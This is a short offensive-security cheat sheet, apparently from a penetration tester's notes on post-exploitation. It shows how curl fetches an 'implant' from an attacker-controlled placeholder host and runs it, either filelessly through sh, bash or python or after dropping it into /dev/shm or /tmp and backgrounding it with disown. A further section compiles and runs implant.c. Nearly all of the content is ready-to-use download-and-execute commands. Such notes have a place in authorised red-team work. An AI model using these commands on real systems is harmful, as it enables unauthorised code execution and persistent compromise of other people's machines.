# cURL

## 01 - Fileless Code Execution

```
$ curl http[s]://<IP>/implant.sh | sh

$ curl http[s]://<IP>/implant.sh | bash

$ curl http[s]://<IP>/implant.py | python
```

## 02 - Dropping On Memory

> [!INFO] Got Permission Denied!
> If you get a `Permission denied` error while executing it in `/dev/shm/`. Check the [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Desktop/Linux/Host/0xM - System and Kernel Version/Manual/Living off the Land#^017cc1|mounted drives]] if `noexec` is configured. Otherwise execute it with a [[#01 - Fileless Code Execution|fileless]] method.

Download implant and execute it.

```
$ curl -o /dev/shm/implant http[s]://<IP>/implant && chmod +x /dev/shm/implant && /dev/shm/implant & disown
```

## 03 - Dropping On Disk

Download implant and execute it.

```
$ curl -o /tmp/implant http[s]://<IP>/implant && chmod +x /tmp/implant && /tmp/implant & disown
```

## 04 - Compiled After Delivery

TODO: Fill this info

```
$ gcc -o implant implant.c && implant & disown
```

---
## References

### GTFOBins

- [GTFOBins: curl](https://gtfobins.github.io/gtfobins/curl/)

### GTFOArgs

- [GTFOArgs: curl](https://gtfoargs.github.io/gtfoargs/curl/)